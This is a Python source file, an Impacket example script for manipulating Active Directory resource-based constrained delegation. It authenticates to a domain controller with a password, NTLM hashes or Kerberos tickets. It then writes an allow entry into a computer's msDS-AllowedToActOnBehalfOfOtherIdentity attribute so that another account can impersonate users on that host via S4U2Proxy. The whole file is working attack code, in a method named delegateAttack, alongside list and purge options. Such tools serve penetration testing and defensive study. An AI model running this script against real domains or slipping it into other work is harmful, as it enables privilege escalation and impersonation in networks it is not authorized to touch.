#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This script will manipulate resource-based constrained delegation privileges to a host.
#   Currently supports listing, adding and purging resource-based constrained delegation privileges.
#
# Author:
#   P3nt4 (@xP3nt4)
#
# Credits:
#  This code is heavily inspired by addComputer.py and ntlmrelayx.py from:
#  JaGoTu (@jagotu)
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) /


from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech

import ldap3
import argparse
import logging
import sys
import ssl
import os
from binascii import unhexlify
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.formatters.formatters import format_sid
from impacket.ldap import ldaptypes

  # Create an ALLOW ACE with the specified sid
def create_allow_ace(sid):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551 # Full control
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    nace['Ace'] = acedata
    return nace

def create_empty_sd():
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    # BUILTIN\Administrators
    sd['OwnerSid'].fromCanonical('S-1-5-32-544')
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    sd['Dacl'] = acl
    return sd


class DELEGATEACCESS:
    def __init__(self, username, password, domain, cmdLineOptions):
        self.options = cmdLineOptions
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__hashes = cmdLineOptions.hashes
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__target = cmdLineOptions.dc_host
        self.__kdcHost = cmdLineOptions.dc_host
        self.__delegateTo = cmdLineOptions.delegate_to
        self.__delegateFrom = cmdLineOptions.delegate_from
        self.__listOnly = cmdLineOptions.list_only
        self.__purge = cmdLineOptions.purge
        self.__port = cmdLineOptions.port
        self.__protocol = cmdLineOptions.protocol
        self.__domainNetbios = cmdLineOptions.domain_netbios
        self.__targetIp = cmdLineOptions.dc_ip

        if self.__targetIp is not None:
            self.__kdcHost = self.__targetIp

        if self.__doKerberos and cmdLineOptions.dc_host is None:
            raise ValueError("Kerberos auth requires DNS name of the target DC. Use -dc-host.")

        if not '.' in self.__domain:
            logging.warning('\'%s\' doesn\'t look like a FQDN. Generating baseDN will probably fail.' % self.__domain)

        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        if self.__target is None:
            if not '.' in self.__domain:
                logging.warning('No DC host set and \'%s\' doesn\'t look like a FQDN. DNS resolution of short names will probably fail.' % self.__domain)
            self.__target = self.__domain
        
        if self.__protocol is None:
            self.__protocol = "ldap"

        if self.__port is None and self.__protocol == "ldap":
            self.__port = 389
        elif self.__port is None and self.__protocol == "ldaps":
            self.__port = 636

        if self.__domainNetbios is None:
            self.__domainNetbios = self.__domain

        if self.__delegateFrom is None:
            self.__delegateFrom = self.__username

        if self.__hashes is not None and len(self.__hashes.split(":")[0]) < 32:
            self.__hashes = "aad3b435b51404eeaad3b435b51404ee:" +  self.__hashes.split(":")[1]


        if not self.__delegateFrom[-1] == '$':
             raise ValueError("Only computer accounts can delegate privileges, use -delegate-from HOST$")

        if not self.__listOnly and self.__delegateTo is None and not self.__purge :
            raise ValueError("No user to delegate to, use -delegate-to USER, -list-only or -purge")

        if self.__purge and not self.__delegateTo is None:
            raise ValueError("-delegate-to and -purge options are not compatible")

        domainParts = self.__domain.split('.')
        self.__baseDN = ''
        for i in domainParts:
            self.__baseDN += 'dc=%s,' % i
        # Remove last ','
        self.__baseDN = self.__baseDN[:-1]

    def getUserInfo(self, ldapConn, samname):
        logging.debug('Searching for user: %s' % samname)
        ldapConn.search(self.__baseDN, '(sAMAccountName=%s)' % escape_filter_chars(samname), attributes=['objectSid'])
        try:
            dn = ldapConn.entries[0].entry_dn
            logging.debug('Found user with DN: %s' % dn)
            sid = ldapConn.entries[0]['objectSid']
            sid = format_sid(sid.raw_values[0])
            logging.debug('Found user with SID: %s' % sid)
            return (dn, sid)
        except IndexError:
            logging.error('User not found in LDAP: %s' % samname)
            return False

    def delegateAttack(self, ldapConn):
        # Get target computer DN
        result = self.getUserInfo(ldapConn, self.__delegateFrom)
        if not result:
            logging.error('Computer %s does not exist! (wrong domain?)', self.__delegateFrom)
            return
        target_dn = result[0]

        # Get sid of computer to delegate to
        if not (self.__listOnly or self.__purge):
            result = self.getUserInfo(ldapConn, self.__delegateTo)
            if not result:
                logging.error('User to escalate does not exist!')
                return
            escalate_sid = str(result[1])

        ldapConn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        targetuser = None
        for entry in ldapConn.response:
            if entry['type'] != 'searchResEntry':
                continue
            targetuser = entry
        if not targetuser:
            logging.error('Could not query target user properties')
            return
        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
            logging.info('Currently allowed sids:')
            for ace in sd['Dacl'].aces:
                logging.info('    %s' % ace['Ace']['Sid'].formatCanonical())
        except IndexError:
            # Create DACL manually
            sd = create_empty_sd()
        if self.__listOnly:
            return
        if self.__purge:
            logging.info('Purging delegation rights for user: %s', self.__delegateFrom)
            sd = create_empty_sd()
        else:
            sd['Dacl'].aces.append(create_allow_ace(escalate_sid))
        ldapConn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
        if ldapConn.result['result'] == 0:
            logging.info('Delegation rights modified succesfully!')
            if not self.__purge:
                logging.info('%s can now impersonate users on %s via S4U2Proxy', self.__delegateTo, self.__delegateFrom)
        else:
            if ldapConn.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s', ldapConn.result['message'])
            elif ldapConn.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s', ldapConn.result['message'])
            else:
                logging.error('The server returned an error: %s', ldapConn.result['message'])
        return


    def run(self):
        connectTo = self.__target
        if self.__targetIp is not None:
            connectTo = self.__targetIp
        try:
            user = '%s\\%s' % (self.__domain, self.__username)
            if self.__protocol == "ldaps":
                try:
                    tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
                    ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
                except ldap3.core.exceptions.LDAPSocketOpenError:
                    tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1)
                    ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
            else:
                ldapServer = ldap3.Server(connectTo, use_ssl=False, port=self.__port, get_info=ldap3.ALL)
            if self.__doKerberos:
                ldapConn = ldap3.Connection(ldapServer)
                self.LDAP3KerberosLogin(ldapConn, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                                self.__aesKey, kdcHost=self.__kdcHost)
            elif self.__hashes is not None:
                ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
                if not ldapConn.bind():
                    logging.error("Could not connect with the provided credentials")
                    return
            else:
                ldapConn = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
                if not ldapConn.bind():
                    logging.error("Could not connect with the provided credentials")
                    return
                
            self.delegateAttack(ldapConn)

        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()

            logging.critical(str(e))


    def LDAP3KerberosLogin(self, connection, user, password, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None,
                      TGS=None, useCache=True):
        from pyasn1.codec.ber import encoder, decoder
        from pyasn1.type.univ import noValue
        """
        logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.

        :param string user: username
        :param string password: password for the user
        :param string domain: domain where the account is valid for (required)
        :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
        :param string nthash: NTHASH used to authenticate using hashes (password is not used)
        :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
        :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
        :param struct TGT: If there's a TGT available, send the structure here and it will be used
        :param struct TGS: same for TGS. See smb3.py for the format
        :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False

        :return: True, raises an Exception if error.
        """

        if lmhash != '' or nthash != '':
            if len(lmhash) % 2:
                lmhash = '0' + lmhash
            if len(nthash) % 2:
                nthash = '0' + nthash
            try:  # just in case they were converted already
                lmhash = unhexlify(lmhash)
                nthash = unhexlify(nthash)
            except TypeError:
                pass

        # Importing down here so pyasn1 is not required if kerberos is not used.
        from impacket.krb5.ccache import CCache
        from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal, KerberosTime, Ticket
        import datetime

        if TGT is not None or TGS is not None:
            useCache = False

        if useCache:
            try:
                ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
            except Exception as e:
                # No cache present
                print(e)
                pass
            else:
                # retrieve domain information from CCache file if needed
                if domain == '':
                    domain = ccache.principal.realm['data'].decode('utf-8')
                    logging.debug('Domain retrieved from CCache: %s' % domain)

                logging.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
                principal = 'ldap/%s@%s' % (self.__target.upper(), domain.upper())

                creds = ccache.getCredential(principal)
                if creds is None:
                    # Let's try for the TGT and go from there
                    principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                    creds = ccache.getCredential(principal)
                    if creds is not None:
                        TGT = creds.toTGT()
                        logging.debug('Using TGT from cache')
                    else:
                        logging.debug('No valid credentials found in cache')
                else:
                    TGS = creds.toTGS(principal)
                    logging.debug('Using TGS from cache')

                # retrieve user information from CCache file if needed
                if user == '' and creds is not None:
                    user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                    logging.debug('Username retrieved from CCache: %s' % user)
                elif user == '' and len(ccache.principal.components) > 0:
                    user = ccache.principal.components[0]['data'].decode('utf-8')
                    logging.debug('Username retrieved from CCache: %s' % user)

        # First of all, we need to get a TGT for the user
        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if TGT is None:
            if TGS is None:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, lmhash, nthash,
                                                                        aesKey, kdcHost)
        else:
            tgt = TGT['KDC_REP']
            cipher = TGT['cipher']
            sessionKey = TGT['sessionKey']

        if TGS is None:
            serverName = Principal('ldap/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, kdcHost, tgt, cipher,
                                                                    sessionKey)
        else:
            tgs = TGS['KDC_REP']
            cipher = TGS['cipher']
            sessionKey = TGS['sessionKey']

            # Let's build a NegTokenInit with a Kerberos REQ_AP

        blob = SPNEGO_NegTokenInit()

        # Kerberos
        blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]

        # Let's extract the ticket from the TGS
        tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        # Now let's build the AP_REQ
        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = []
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = domain
        seq_set(authenticator, 'cname', userName.components_to_asn1)
        now = datetime.datetime.utcnow()

        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 11
        # AP-REQ Authenticator (includes application authenticator
        # subkey), encrypted with the application session key
        # (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        blob['MechToken'] = encoder.encode(apReq)


        request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO', blob.getData())

        # Done with the Kerberos saga, now let's get into LDAP
        if connection.closed:  # try to open connection if closed
                connection.open(read_server_info=False)

        connection.sasl_in_progress = True
        response = connection.post_send_single_response(connection.send('bindRequest', request, None))
        connection.sasl_in_progress = False
        if response[0]['result'] != 0:
            raise Exception(response)

        connection.bound = True

        return True
            

# Process command-line arguments.
if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    print((version.BANNER))

    parser = argparse.ArgumentParser(add_help = True, description = "Manipulate resource-based constrained delegation privileges to a host.")

    if sys.version_info.major == 2 and sys.version_info.minor == 7 and sys.version_info.micro < 16: #workaround for https://bugs.python.org/issue11874
        parser.add_argument('account', action='store', help='[domain/]username[:password] Account used to authenticate to DC.')
    else:
        parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
    parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-protocol', action='store', choices=['ldap','ldaps'], help='The protocol to use')
    parser.add_argument('-port', type=int, help='The port to use, defaults to 389 for ldap and 636 for ldaps')


    group = parser.add_argument_group('delegation')
    group.add_argument('-delegate-to', action='store', metavar='delegate_to', help='Delegate to this host')
    group.add_argument('-delegate-from', action='store', metavar='delegate_from', help='Delegate from this host, defaults to the current user')
    group.add_argument('-list-only', action='store_true', help='Do not add delegation, list current delegation privileges for the host')
    group.add_argument('-purge', action='store_true', help='Purge delegation privileges of the host, defaults to the current user')
    
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on account parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-host', action='store',metavar = "hostname",  help='Hostname of the domain controller to use. '
                                                                              'If ommited, the domain part (FQDN) '
                                                                              'specified in the account parameter will be used')
    group.add_argument('-dc-ip', action='store',metavar = "ip",  help='IP of the domain controller to use. '
                                                                      'Useful if you can\'t translate the FQDN.'
                                                                      'specified in the account parameter will be used')


    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.account)

    try:
        if domain is None or domain == '':
            logging.critical('Domain should be specified!')
            sys.exit(1)

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
            from getpass import getpass
            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True


        executer = DELEGATEACCESS(username, password, domain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print(str(e))
